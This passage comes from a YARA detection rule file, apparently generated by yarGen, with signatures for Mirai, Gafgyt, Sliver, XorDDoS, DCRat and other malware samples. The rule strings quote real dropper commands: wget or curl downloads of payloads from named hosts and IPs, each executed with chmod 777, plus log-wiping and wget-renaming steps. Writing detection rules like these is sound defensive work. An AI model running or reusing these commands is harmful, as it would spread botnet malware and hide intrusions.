      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "ab64fead6e3fa3d04e29c299fdd4559700d2193306b55ad58031403db092d87e"
   strings:
      $s1 = "srcport" fullword ascii /* score: '11.00'*/
      $s2 = "conn.magicpacketlease.org" fullword ascii /* score: '10.00'*/
      $s3 = "down.magicpacketlease.org" fullword ascii /* score: '10.00'*/
      $s4 = "datarand" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule Mirai_signature__b7f13681 {
   meta:
      description = "dropzone - file Mirai(signature)_b7f13681.sh"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "b7f136813eeb228a82b6339e4e45449e69e990726c17ad5df6d0d519d65a6012"
   strings:
      $s1 = "cd /tmp; rm mpsl; wget http://goth.wtf/mpsl; chmod 777 mpsl; ./mpsl faith_mpsl" fullword ascii /* score: '25.00'*/
      $s2 = "cd /tmp; rm mips; wget http://goth.wtf/mips; chmod 777 mips; ./mips faith_mips" fullword ascii /* score: '25.00'*/
   condition:
      uint16(0) == 0x6463 and filesize < 1KB and
      all of them
}

rule Mirai_signature__bf2a44b6 {
   meta:
      description = "dropzone - file Mirai(signature)_bf2a44b6.sh"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "bf2a44b6c4e5d851d5dacd0d0d34e98bd3051eed36c02f638df15aa96f74df78"
   strings:
      $s1 = "busybox wget http://149.102.155.8/systemcl/mpsl; chmod 777 mpsl; ./mpsl mpsl" fullword ascii /* score: '23.00'*/
      $s2 = "busybox wget http://149.102.155.8/systemcl/arm7; chmod 777 arm7; ./arm7 arm7" fullword ascii /* score: '23.00'*/
      $s3 = "busybox wget http://149.102.155.8/systemcl/arm5; chmod 777 arm5; ./arm5 arm5" fullword ascii /* score: '23.00'*/
      $s4 = "busybox wget http://149.102.155.8/systemcl/x86; chmod 777 x86; ./x86 x86" fullword ascii /* score: '23.00'*/
      $s5 = "busybox wget http://149.102.155.8/systemcl/mips; chmod 777 mips; ./mips mips" fullword ascii /* score: '23.00'*/
      $s6 = "busybox wget http://149.102.155.8/systemcl/arm; chmod 777 arm; ./arm arm" fullword ascii /* score: '23.00'*/
      $s7 = "busybox wget http://149.102.155.8/systemcl/ppc; chmod 777 ppc; ./ppc ppc" fullword ascii /* score: '23.00'*/
      $s8 = "busybox wget http://149.102.155.8/systemcl/sh4; chmod 777 sh4; ./sh4 sh4" fullword ascii /* score: '23.00'*/
      $s9 = "busybox wget http://149.102.155.8/systemcl/spc; chmod 777 spc; ./spc spc" fullword ascii /* score: '23.00'*/
      $s10 = "busybox wget http://149.102.155.8/systemcl/arm6; chmod 777 arm6; ./arm6 arm6" fullword ascii /* score: '23.00'*/
      $s11 = "busybox wget http://149.102.155.8/systemcl/x86_64; chmod 777 x86_64; ./x86_64 x86_64" fullword ascii /* score: '23.00'*/
      $s12 = "busybox wget http://149.102.155.8/systemcl/m68k; chmod 777 m68k; ./m68k m68k" fullword ascii /* score: '23.00'*/
   condition:
      uint16(0) == 0x7562 and filesize < 2KB and
      8 of them
}

rule Mirai_signature__c477dca9 {
   meta:
      description = "dropzone - file Mirai(signature)_c477dca9.sh"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "c477dca92064857f241696c714d41f83e4b1c6dc7074906f7ded64d9ba607bd5"
   strings:
      $s1 = "wget http://eclipseservices.xyz/arm4 -O b; chmod 777 b; ./b arm4; rm -rf b" fullword ascii /* score: '25.00'*/
      $s2 = "wget http://eclipseservices.xyz/mips -O b; chmod 777 b; ./b mips; rm -rf b" fullword ascii /* score: '25.00'*/
      $s3 = "wget http://eclipseservices.xyz/arm5 -O b; chmod 777 b; ./b arm5; rm -rf b" fullword ascii /* score: '25.00'*/
      $s4 = "wget http://eclipseservices.xyz/arm6 -O b; chmod 777 b; ./b arm6; rm -rf b" fullword ascii /* score: '25.00'*/
      $s5 = "wget http://eclipseservices.xyz/arm7 -O b; chmod 777 b; ./b arm7; rm -rf b" fullword ascii /* score: '25.00'*/
      $s6 = "wget http://eclipseservices.xyz/x86_64 -O b; chmod 777 b; ./b x86_64; rm -rf b" fullword ascii /* score: '25.00'*/
      $s7 = "wget http://eclipseservices.xyz/mpsl -O b; chmod 777 b; ./b mipsel; rm -rf b" fullword ascii /* score: '25.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 1KB and
      all of them
}

rule Mirai_signature__c7fccd4e {
   meta:
      description = "dropzone - file Mirai(signature)_c7fccd4e.sh"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "c7fccd4e61e29251649ea999b0c77de77b2c9be997ffa6ea20db82cd9d890b40"
   strings:
      $s1 = "curl http://149.102.155.8/systemcl/arm5; chmod 777 arm5; ./arm5 arm5" fullword ascii /* score: '18.00'*/
      $s2 = "curl http://149.102.155.8/systemcl/x86; chmod 777 x86; ./x86 x86" fullword ascii /* score: '18.00'*/
      $s3 = "curl http://149.102.155.8/systemcl/ppc; chmod 777 ppc; ./ppc ppc" fullword ascii /* score: '18.00'*/
      $s4 = "curl http://149.102.155.8/systemcl/arm7; chmod 777 arm7; ./arm7 arm7" fullword ascii /* score: '18.00'*/
      $s5 = "curl http://149.102.155.8/systemcl/arm; chmod 777 arm; ./arm arm" fullword ascii /* score: '18.00'*/
      $s6 = "curl http://149.102.155.8/systemcl/arm6; chmod 777 arm6; ./arm6 arm6" fullword ascii /* score: '18.00'*/
      $s7 = "curl http://149.102.155.8/systemcl/mpsl; chmod 777 mpsl; ./mpsl mpsl" fullword ascii /* score: '18.00'*/
      $s8 = "curl http://149.102.155.8/systemcl/sh4; chmod 777 sh4; ./sh4 sh4" fullword ascii /* score: '18.00'*/
      $s9 = "curl http://149.102.155.8/systemcl/x86_64; chmod 777 x86_64; ./x86_64 x86_64" fullword ascii /* score: '18.00'*/
      $s10 = "curl http://149.102.155.8/systemcl/spc; chmod 777 spc; ./spc spc" fullword ascii /* score: '18.00'*/
      $s11 = "curl http://149.102.155.8/systemcl/m68k; chmod 777 m68k; ./m68k m68k" fullword ascii /* score: '18.00'*/
      $s12 = "curl http://149.102.155.8/systemcl/mips; chmod 777 mips; ./mips mips" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x7563 and filesize < 2KB and
      8 of them
}

rule Mirai_signature__c9c3c3b0 {
   meta:
      description = "dropzone - file Mirai(signature)_c9c3c3b0.sh"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "c9c3c3b0654729b3964ec9c1763e8b85cfee902d729b1e63bc1cef1d8b43b093"
   strings:
      $s1 = "cd /tmp; rm mpsl; wget http://46.23.108.231/mpsl; chmod 777 mpsl; ./mpsl faith" fullword ascii /* score: '27.00'*/
      $s2 = "cd /tmp; rm mips; wget http://46.23.108.231/mips; chmod 777 mips; ./mips faith" fullword ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x6463 and filesize < 1KB and
      all of them
}

rule Mirai_signature__df125247 {
   meta:
      description = "dropzone - file Mirai(signature)_df125247.sh"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "df125247d2a65af63b374cf6d7d0dce103bd364d074388d0f10017288e22d10f"
   strings:
      $s1 = "wget http://goth.wtf/x86_64; chmod 777 x86_64; ./x86_64 x86" fullword ascii /* score: '18.00'*/
      $s2 = "wget http://goth.wtf/arm5; chmod 777 arm5; ./arm5 arm5" fullword ascii /* score: '18.00'*/
      $s3 = "wget http://goth.wtf/mips; chmod 777 mips; ./mips mips" fullword ascii /* score: '18.00'*/
      $s4 = "wget http://goth.wtf/arm7; chmod 777 arm7; ./arm7 arm7" fullword ascii /* score: '18.00'*/
      $s5 = "wget http://goth.wtf/arm6; chmod 777 arm6; ./arm6 arm6" fullword ascii /* score: '18.00'*/
      $s6 = "wget http://goth.wtf/arm4; chmod 777 arm4; ./arm4 arm4" fullword ascii /* score: '18.00'*/
      $s7 = "wget http://goth.wtf/mpsl; chmod 777 mpsl; ./mpsl mpsl" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x6777 and filesize < 1KB and
      all of them
}

rule Mirai_signature__f625cd36 {
   meta:
      description = "dropzone - file Mirai(signature)_f625cd36.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "f625cd36e5b63688a157147c11a3ea48beb8f2a48ce7d8a8f232b9c6f05bc36f"
   strings:
      $s1 = "9.nBo:\\~" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 90KB and
      all of them
}

rule Sliver_signature_ {
   meta:
      description = "dropzone - file Sliver(signature).sh"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "6bcae8f7016b166affdff426d2269c23feb5fcf5f482ee809976adea3e0f9453"
   strings:
      $s1 = "wget -O /usr/bin/linux http://181.223.9.36:9000/linux > /dev/null 2>&1" fullword ascii /* score: '24.00'*/
      $s2 = "if [[ ! -f /usr/bin/linux ]]; then" fullword ascii /* score: '15.00'*/
      $s3 = "[[ $var -eq 0 ]] && /usr/bin/linux > /dev/null 2>&1 &" fullword ascii /* score: '14.00'*/
      $s4 = "var=`ps -C linux | grep -v PID | wc -l`" fullword ascii /* score: '12.00'*/
      $s5 = "[[ $var -gt 1 ]] && killall linux > /dev/null 2>&1 " fullword ascii /* score: '11.00'*/
      $s6 = "chmod +x /usr/bin/linux" fullword ascii /* score: '11.00'*/
      $s7 = "chattr +i /usr/bin/linux" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 1KB and
      all of them
}

rule XorDDoS_signature__2 {
   meta:
      description = "dropzone - file XorDDoS(signature).sh"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "c770508261d5fd638f02d9dbe75fba828e39c759f2502fb435558c404443a22b"
   strings:
      $s1 = "wget http://89.32.41.25/r.txt -O sdf3fslsdf13" fullword ascii /* score: '28.00'*/
      $s2 = "wget http://89.32.41.25/p.txt -O ygljglkjgfg1" fullword ascii /* score: '28.00'*/
      $s3 = "curl http://89.32.41.25/r.txt -o sdf3fslsdf15" fullword ascii /* score: '27.00'*/
      $s4 = "curl http://89.32.41.25/p.txt -o ygljglkjgfg0" fullword ascii /* score: '27.00'*/
      $s5 = "good http://89.32.41.25/p.txt -O ygljglkjgfg2" fullword ascii /* score: '23.00'*/
      $s6 = "good http://89.32.41.25/r.txt -O sdf3fslsdf14" fullword ascii /* score: '23.00'*/
      $s7 = "mv /bin/wget /bin/good" fullword ascii /* score: '16.00'*/
      $s8 = "cat /dev/null > /var/log/yum.log" fullword ascii /* score: '16.00'*/
      $s9 = "mv /usr/bin/wget /usr/bin/good" fullword ascii /* score: '16.00'*/
      $s10 = "cat /dev/null > /var/log/boot.log" fullword ascii /* score: '16.00'*/
      $s11 = "cat /dev/null > /var/log/wtmp" fullword ascii /* score: '12.00'*/
      $s12 = "cat /dev/null > /var/log/btmp" fullword ascii /* score: '12.00'*/
      $s13 = "ls -la /var/run/gcc.pid" fullword ascii /* score: '11.00'*/
      $s14 = "for i in \"/bin\" \"/home\" \"/root\" \"/tmp\" \"/usr\" \"/etc\"" fullword ascii /* score: '10.00'*/
      $s15 = "cat /dev/null > /var/log/syslog" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x6477 and filesize < 3KB and
      8 of them
}

/* Super Rules ------------------------------------------------------------- */

rule _c990338f8145dc29c6f38fb73cf05c77_imphash__Metasploit_signature__c990338f8145dc29c6f38fb73cf05c77_imphash__0 {
   meta:
      description = "dropzone - from files c990338f8145dc29c6f38fb73cf05c77(imphash).exe, Metasploit(signature)_c990338f8145dc29c6f38fb73cf05c77(imphash).exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "a64f34bbba754591e6aafbaa47cfdb9327dc433ebd2d94be6575aecb999b72f6"
      hash2 = "7adc27aa2eabe3ae14f8d7f04f363693c435f4d025646ce8288f627d76885cdc"
   strings:
      $s1 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*" ascii /* score: '27.00'*/
      $s2 = "bVCRUNTIME140.dll" fullword ascii /* score: '26.00'*/
      $s3 = "VCRUNTIME140.dll" fullword wide /* score: '26.00'*/
      $s4 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*" ascii /* score: '24.00'*/
      $s5 = "bpython310.dll" fullword ascii /* score: '23.00'*/
      $s6 = "6python310.dll" fullword ascii /* score: '23.00'*/
      $s7 = "VCRUNTIME140_1.dll" fullword wide /* score: '23.00'*/
      $s8 = "Failed to extract %s: failed to open target file!" fullword ascii /* score: '22.50'*/
      $s9 = "LOADER: failed to convert runtime-tmpdir to a wide string." fullword wide /* score: '22.00'*/
      $s10 = "LOADER: failed to expand environment variables in the runtime-tmpdir." fullword wide /* score: '22.00'*/
      $s11 = "LOADER: runtime-tmpdir points to non-existent drive %ls (type: %d)!" fullword wide /* score: '22.00'*/
      $s12 = "LOADER: failed to obtain the absolute path of the runtime-tmpdir." fullword wide /* score: '22.00'*/
      $s13 = "LOADER: failed to create runtime-tmpdir path %ls!" fullword wide /* score: '22.00'*/
      $s14 = "blibcrypto-1_1.dll" fullword ascii /* score: '20.00'*/
      $s15 = "blibffi-7.dll" fullword ascii /* score: '20.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 16000KB and pe.imphash() == "c990338f8145dc29c6f38fb73cf05c77" and ( 8 of them )
      ) or ( all of them )
}

rule _DCRat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__dd71110a_XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_impha_1 {
   meta:
      description = "dropzone - from files DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_dd71110a.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_c7f4e1ab.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "dd71110a6b7fb79b2949280611957646f76503f1bda866b06e74b9a74e54dc89"
      hash2 = "c7f4e1aba81ad7714da4487dd279cc886b50428116b614c9ebe246d937c478f0"
   strings:
      $x1 = "C:\\Users\\Professor\\Desktop\\BitJoiner\\payload\\obj\\Debug\\payload.pdb" fullword ascii /* score: '42.00'*/
      $x2 = "payload.exe" fullword wide /* score: '31.00'*/
      $s3 = "RDxDfuqVkkLBQm5DxNH.oTNe2mqpxJ7hV6uF1Ir+L8NfWmqIIC4SmMWto77+PaaoUqq0bBNnmbDLPfH`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '27.00'*/
      $s4 = " https://docs.microsoft.com/windows/win32/fileio/maximum-file-path-limitation.-->" fullword ascii /* score: '22.00'*/
      $s5 = "msblockinto.exe" fullword ascii /* score: '22.00'*/
      $s6 = "\"C:\\driverNet\\msblockinto.exe\"UT" fullword ascii /* score: '20.00'*/
      $s7 = "RDxDfuqVkkLBQm5DxNH.oTNe2mqpxJ7hV6uF1Ir+L8NfWmqIIC4SmMWto77+PaaoUqq0bBNnmbDLPfH`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '18.00'*/
      $s8 = "payload.Resources.resources" fullword ascii /* score: '16.00'*/
      $s9 = "payload.Resources" fullword wide /* score: '16.00'*/
      $s10 = "WDItYDdTJ6" fullword ascii /* base64 encoded string 'X2-`7S'' */ /* score: '15.00'*/
      $s11 = " bvElR9l3e6M3DQU5UdF6aCm2nAId.bat" fullword ascii /* score: '15.00'*/
      $s12 = "VjkkMyA9UX" fullword ascii /* base64 encoded string 'V9$3 =Q' */ /* score: '14.00'*/
      $s13 = "JkJJWWJxSd" fullword ascii /* base64 encoded string '&BIYbqI' */ /* score: '14.00'*/
      $s14 = "payload.My.Resources" fullword ascii /* score: '13.00'*/
      $s15 = "             requestedExecutionLevel " fullword ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 15000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

import "pe"

rule DCRat_hybrid_cautious_f34d5f2d4577ed6d9ceec516c1f5a744
{
  meta:
    description = "Hybrid: file path (PE + size + core strings) OR memory path (defined(pe) + core strings) OR imphash-assisted path"
    imphash = "f34d5f2d4577ed6d9ceec516c1f5a744"
    vantage = "on_disk|memory"

  strings:
    // core signals (taken from your original literals)
    $core1 = "System.Object, mscorlib, Version=4.0.0.0" ascii
    $core2 = "p0CmcG3iLLOGpCUQXaj" ascii fullword
    $core3 = "vQDlL1ZLqZjZSm9oCfC" ascii fullword
    $core4 = "kKZm1OsqiyGH7VcP0cy" ascii fullword
    $core5 = "KjoBZvGpspYh8KBXe9F" ascii fullword

  condition:
    // File-on-disk path: PE magic + reasonable size + enough core strings
    ( uint16(0) == 0x5A4D and filesize < 4000KB and 3 of ($core*) )

    or

    // Imphash-assisted path: exact imphash but still demand minimal core signal
    (pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and 2 of ($core*) )
}


rule _1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836ee52b756929dc7f_1e7bb739_Traitor_signature__3 {
   meta:
      description = "dropzone - from files 1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836ee52b756929dc7f_1e7bb739.macho, Traitor(signature).elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836ee52b756929dc7f"
      hash2 = "fdfbfc07248c3359d9f1f536a406d4268f01ed63a856bd6cef9dccb3cf4f2376"
   strings:
      $s1 = "net/http.(*http2clientConnReadLoop).processHeaders" fullword ascii /* score: '23.00'*/
      $s2 = "github.com/google/uuid.invalidLengthError.Error" fullword ascii /* score: '20.00'*/
      $s3 = "os.Executable" fullword ascii /* score: '20.00'*/
      $s4 = "crypto/tls.rsaKeyAgreement.processServerKeyExchange" fullword ascii /* score: '20.00'*/
      $s5 = "processClientKeyExchange" fullword ascii /* score: '20.00'*/
      $s6 = "github.com/google/uuid.NewRandomFromReader" fullword ascii /* score: '20.00'*/
      $s7 = "github.com/google/uuid.(*invalidLengthError).Error" fullword ascii /* score: '20.00'*/
      $s8 = "crypto/tls.(*rsaKeyAgreement).processServerKeyExchange" fullword ascii /* score: '20.00'*/
      $s9 = "processServerKeyExchange" fullword ascii /* score: '20.00'*/
      $s10 = "crypto/tls.(*ecdheKeyAgreement).processServerKeyExchange" fullword ascii /* score: '20.00'*/
      $s11 = "q*func(*tls.Config, *tls.Certificate, *tls.clientHelloMsg, *tls.serverHelloMsg) (*tls.serverKeyExchangeMsg, error)" fullword ascii /* score: '19.00'*/
      $s12 = "crypto/x509.SystemRootsError.Error" fullword ascii /* score: '19.00'*/
      $s13 = "net/http.(*http2Transport).logf" fullword ascii /* score: '19.00'*/
      $s14 = "net/http.(*http2Framer).logWrite" fullword ascii /* score: '19.00'*/
      $s15 = "crypto/x509.SystemRootsError.Unwrap" fullword ascii /* score: '19.00'*/
   condition:
      ( ( uint16(0) == 0xfacf or uint16(0) == 0x457f ) and filesize < 29000KB and ( 8 of them )
      ) or ( all of them )
}

rule _8fe920b9b00d64ef61da2376dae2e5842aaccd8bf0f8f6cd1401964057c44ae8_8fe920b9_97495cae59e2535dd0c51e598b574e4ac545e63711a0e167d_4 {
   meta:
      description = "dropzone - from files 8fe920b9b00d64ef61da2376dae2e5842aaccd8bf0f8f6cd1401964057c44ae8_8fe920b9.elf, 97495cae59e2535dd0c51e598b574e4ac545e63711a0e167d21c2b1896a47d28_97495cae.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "8fe920b9b00d64ef61da2376dae2e5842aaccd8bf0f8f6cd1401964057c44ae8"
      hash2 = "97495cae59e2535dd0c51e598b574e4ac545e63711a0e167d21c2b1896a47d28"
   strings:
      $s1 = "glibc.pthread.mutex_spin_count" fullword ascii /* score: '21.00'*/
      $s2 = "sbrk() failure while processing tunables" fullword ascii /* score: '18.00'*/
      $s3 = "glibc.cpu.x86_non_temporal_threshold" fullword ascii /* score: '17.00'*/
      $s4 = "%s%s%s:%u: %s%sAssertion `%s' failed." fullword ascii /* score: '16.50'*/
      $s5 = "*** %s ***: terminated" fullword ascii /* score: '15.00'*/
      $s6 = "_dl_process_pt_note" fullword ascii /* score: '15.00'*/
      $s7 = "(old_top == initial_top (av) && old_size == 0) || ((unsigned long) (old_size) >= MINSIZE && prev_inuse (old_top) && ((unsigned l" ascii /* score: '15.00'*/
      $s8 = "headmap.len == archive_stat.st_size" fullword ascii /* score: '15.00'*/
      $s9 = "execute_stack_op.cold" fullword ascii /* score: '14.00'*/
      $s10 = "execute_cfa_program.cold" fullword ascii /* score: '14.00'*/
      $s11 = "longjmp_target" fullword ascii /* score: '14.00'*/
      $s12 = "__x86_shared_non_temporal_threshold" fullword ascii /* score: '14.00'*/
      $s13 = "unsupported version %s of Verneed record" fullword ascii /* score: '13.00'*/
      $s14 = "unsupported version %s of Verdef record" fullword ascii /* score: '13.00'*/
      $s15 = "cannot process note segment" fullword ascii /* score: '13.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 3000KB and ( 8 of them )
      ) or ( all of them )
}


rule _Ga_gyt_signature__Ga_gyt_signature__02f5da5e_Ga_gyt_signature__0989baea_Ga_gyt_signature__288f74e1_Ga_gyt_signature__2c7847_6 {
   meta:
      description = "dropzone - from files Ga-gyt(signature).elf, Ga-gyt(signature)_02f5da5e.elf, Ga-gyt(signature)_0989baea.elf, Ga-gyt(signature)_288f74e1.elf, Ga-gyt(signature)_2c7847c6.elf, Ga-gyt(signature)_434e9d4e.elf, Ga-gyt(signature)_54211eef.elf, Ga-gyt(signature)_5b0a301f.elf, Ga-gyt(signature)_6fadd3ca.elf, Ga-gyt(signature)_762b8b4b.elf, Ga-gyt(signature)_78d96a4e.elf, Ga-gyt(signature)_79023936.elf, Ga-gyt(signature)_8fa08899.elf, Ga-gyt(signature)_9b8a4f2f.elf, Ga-gyt(signature)_bc6b2a58.elf, Ga-gyt(signature)_bf20687c.elf, Ga-gyt(signature)_c33607a4.elf, Ga-gyt(signature)_f6bae6a5.elf, Mirai(signature)_93f87ab1.elf, Mirai(signature)_c296d027.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "47a6090df746f9fbcf7039cec741bb976f47e742a11f9f46ecb117db2c75e5bb"
      hash2 = "02f5da5ec7878453ab1e968cf41ed971bbb02f0cbd70512d5af75daf17421800"
      hash3 = "0989baeaac805bd0d5e88481eea93572059fef0aab83f615a4669eeb1b2a5e4e"
      hash4 = "288f74e1485e02dd9d8a2465870c7a2cd0cdfd7cd37cf0f6dc603321ff2c8025"
      hash5 = "2c7847c6e3b3246be51a9854113b7af04d888317c1d01bbfaf3fda91ef17f9b1"
      hash6 = "434e9d4ee3f135187678f1c45a41d1f1645144bf0524b8e67f319bab3750927b"
      hash7 = "54211eef81d920804c6993a9c845c29debb08d9c89fc36b37839ddabe9583e34"
      hash8 = "5b0a301fecb83a5cf2d80835b52526ab6653f5c4d483ffca8fa55e8bb92bdbf4"
      hash9 = "6fadd3ca8a858831009f61f489204747cdca5a76cfbd4f0a7c4717eccbc6c6c8"
      hash10 = "762b8b4b4fcb47108b0b698149cd8860e1fb5878e90cbc03c5f32d7831c94b29"
      hash11 = "78d96a4effda17c79b5677e2b6cb7dd31facc6e84e84a3e5ab0d6ed108e4f1f9"
      hash12 = "790239363bb7c49b5895bc14e2f1408294fe01e463d2a6daea7f849b2558d278"
      hash13 = "8fa08899f451671af790f7d8892d08d0ad423dd6f8035a01eb8a6f919e71108d"
      hash14 = "9b8a4f2f10f8e7c07bb98f6e195a74b42fbaedd20c1a81c9a3eb21ef9774a66b"
      hash15 = "bc6b2a586df183671b4fd8dc16f429f97c9a8b2daca73b1c85a539b7cc6c9a80"
      hash16 = "bf20687c56bf3d076e3f42e0649e13efc64f3250c9a3442040e2249efcede3c4"
      hash17 = "c33607a453bd600566cf86611b16a6210c4747b91b484ba7ab913691e80011c8"
      hash18 = "f6bae6a5d2fcb598ba73ab66e4fefd9188781d23ccafe0927fdda6b591182e6e"
      hash19 = "93f87ab1fd7d19cb30d4a0da1e0963b025b8bab41ce59cf8b99e4bc1bf246d6b"
      hash20 = "c296d0270c54621e95e0caebe9132bce4168032cde41d5519dae15406476e43f"
   strings:
      $s1 = "smarteyes login" fullword ascii /* score: '22.00'*/
      $s2 = "MANAGER.SYS" fullword ascii /* score: '22.00'*/
      $s3 = "huawei.com" fullword ascii /* score: '21.00'*/
      $s4 = "host login:" fullword ascii /* score: '20.00'*/
      $s5 = "MGR.SYS" fullword ascii /* score: '19.00'*/
      $s6 = "LocalHost login:" fullword ascii /* score: '19.00'*/
      $s7 = "## login ##" fullword ascii /* score: '19.00'*/
      $s8 = "SAMSUNG ELECTRONICS .*Login" fullword ascii /* score: '19.00'*/
      $s9 = "superlogin" fullword ascii /* score: '19.00'*/
      $s10 = "domain.name login" fullword ascii /* score: '18.00'*/
      $s11 = "llatsni" fullword ascii /* reversed goodware string 'install' */ /* score: '18.00'*/
      $s12 = "none login" fullword ascii /* score: '17.00'*/
      $s13 = "davolink login" fullword ascii /* score: '17.00'*/
      $s14 = "192.168.0.0 login" fullword ascii /* score: '17.00'*/
      $s15 = "hktos login" fullword ascii /* score: '17.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 900KB and ( 8 of them )
      ) or ( all of them )
}

rule _1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb_1bc85591_1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836_7 {
   meta:
      description = "dropzone - from files 1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb_1bc85591.elf, 1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836ee52b756929dc7f_1e7bb739.macho, d42595b695fc008ef2c56aabd8efd68e(imphash).exe, Stealc(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, ValleyRAT(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb"
      hash2 = "1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836ee52b756929dc7f"
      hash3 = "09f3030f45646d4a97e95c3b048ac188a15880062be06f8f6d58403e6972dcc2"
      hash4 = "69b9d3839ec49b118099de54b795d5f21e03bfe7bb8f05717be3c3fc310e77df"
      hash5 = "4ac5c741eac35ec797d10f0f60575e4825128fcd2587705bc6403169eaf32e88"
   strings:
      $s1 = "runtime.mapKeyError2" fullword ascii /* score: '21.00'*/
      $s2 = "runtime.mapKeyError" fullword ascii /* score: '21.00'*/
      $s3 = "runtime.waitReason.isMutexWait" fullword ascii /* score: '21.00'*/
      $s4 = "runtime.dumpStacksRec" fullword ascii /* score: '20.00'*/
      $s5 = "runtime.dumpTypesRec" fullword ascii /* score: '20.00'*/
      $s6 = "ntptr; runtime.fn func(); runtime.link *runtime._defer; runtime.head *internal/runtime/atomic.Pointer[runtime._defer] }]).Compar" ascii /* score: '19.00'*/
      $s7 = "internal/runtime/atomic.(*Pointer[go.shape.struct { runtime.heap bool; runtime.rangefunc bool; runtime.sp uintptr; runtime.pc ui" ascii /* score: '19.00'*/
      $s8 = "runtime.(*rwmutex).init" fullword ascii /* score: '18.00'*/
      $s9 = "runtime.(*traceTypeTable).dump" fullword ascii /* score: '17.00'*/
      $s10 = "runtime.(*traceStackTable).dump" fullword ascii /* score: '17.00'*/
      $s11 = "isMutexWait" fullword ascii /* score: '15.00'*/
      $s12 = "runtime.gfget.func2" fullword ascii /* score: '15.00'*/
      $s13 = "runtime.typePointers.fastForward" fullword ascii /* score: '15.00'*/
      $s14 = "runtime.(*activeSweep).end" fullword ascii /* score: '15.00'*/
      $s15 = "runtime.traceLocker.GCSweepSpan" fullword ascii /* score: '15.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0xfacf or uint16(0) == 0x5a4d ) and filesize < 29000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( 8 of them )
      ) or ( all of them )
}

rule _DCRat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__2f0ff1a3_DCRat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_impha_8 {
   meta:
      description = "dropzone - from files DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2f0ff1a3.exe, DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_dd71110a.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_c7f4e1ab.exe"
      author = "yarGen Rule Generator"
